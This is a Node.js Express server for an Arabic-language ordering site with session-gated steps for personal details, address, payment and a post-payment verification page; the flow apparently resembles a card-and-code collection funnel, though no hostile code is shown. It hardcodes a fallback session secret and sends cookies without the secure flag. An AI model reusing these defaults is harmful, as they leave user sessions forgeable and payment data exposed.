const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const path = require('path');
const routes = require('./routes/api');

const app = express();
const PORT = process.env.PORT || 10000;

app.set('trust proxy', 1);
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.use(session({
    secret: process.env.SESSION_SECRET || 'fazaa-secret-key-2026',
    resave: false,
    saveUninitialized: true,
    name: 'fazaa.sid',
    cookie: {
        maxAge: 60 * 60 * 1000,
        httpOnly: true,
        secure: false,
        sameSite: 'lax'
    }
}));

app.use(express.static(path.join(__dirname, 'public')));

app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.use('/api', routes);

// Order Step 1 - Personal Info
app.get('/order1', (req, res) => {
    if (!req.session.userId) {
        return res.redirect('/?error=session_required');
    }
    res.sendFile(path.join(__dirname, 'public', 'order1.html'));
});

// Order Step 2 - Address Info
app.get('/order2', (req, res) => {
    if (!req.session.userId) {
        return res.redirect('/?error=session_required');
    }
    res.sendFile(path.join(__dirname, 'public', 'order2.html'));
});

// Order Step 3 - Summary & Payment
app.get('/order3', (req, res) => {
    if (!req.session.userId) {
        return res.redirect('/?error=session_required');
    }
    res.sendFile(path.join(__dirname, 'public', 'order3.html'));
});

// /order - start session on server then redirect to /order1
app.get('/order', async (req, res, next) => {
    try {
        const tier = req.query.tier || req.session.orderData?.tier || 'platinum';
        
        // Start session if not exists
        if (!req.session.userId) {
            const { v4: uuidv4 } = require('uuid');
            req.session.userId = uuidv4();
            req.session.currentStep = 1;
            req.session.orderStarted = false;
            req.session.orderCompleted = false;
            req.session.paymentCompleted = false;
            req.session.verified = false;
            req.session.orderData = { tier };
        }
        
        // Update tier if provided
        if (req.session.orderData) {
            req.session.orderData.tier = tier;
        }
        
        // Send HTML that redirects with meta refresh (more reliable for cookies)
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta http-equiv="refresh" content="0;url=/order1">
                <script>window.location.replace('/order1');</script>
            </head>
            <body>
                <p>جاري التحويل...</p>
            </body>
            </html>
        `);
    } catch (error) {
        next(error);
    }
});

// /payment - يحتاج orderCompleted
app.get('/payment', (req, res) => {
    console.log('/payment - userId:', req.session.userId, 'orderCompleted:', req.session.orderCompleted);
    if (!req.session.userId) {
        return res.redirect('/?error=session_required');
    }
    if (!req.session.orderCompleted) {
        return res.redirect('/?error=complete_order_first');
    }
    res.sendFile(path.join(__dirname, 'public', 'payment.html'));
});

// Legacy route kept only as a compatibility stub so older clients do not trigger the old combined message.
app.post('/api/complete-payment', (req, res) => {
    console.log('/api/complete-payment called - legacy route rejected');
    res.status(410).json({
        success: false,
        error: 'تم إيقاف المسار القديم، استخدم /api/submit-payment'
    });
});

// /verification - يحتاج paymentCompleted
app.get('/verification', (req, res) => {
    console.log('/verification - userId:', req.session.userId, 'paymentCompleted:', req.session.paymentCompleted);
    if (!req.session.userId) {
        return res.redirect('/?error=session_required');
    }
    if (!req.session.paymentCompleted) {
        return res.redirect('/?error=complete_payment_first');
    }
    res.sendFile(path.join(__dirname, 'public', 'verification.html'));
});

// /success - يحتاج verified
app.get('/success', (req, res) => {
    console.log('/success - userId:', req.session.userId, 'verified:', req.session.verified);
    if (!req.session.userId) {
        return res.redirect('/');
    }
    if (!req.session.verified) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'success.html'));
});

// Catch-all
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.use((err, req, res, next) => {
    console.error('Error:', err.message);
    res.status(500).json({ error: 'Server error' });
});

app.listen(PORT, () => {
    console.log('Server running on port ' + PORT);
});
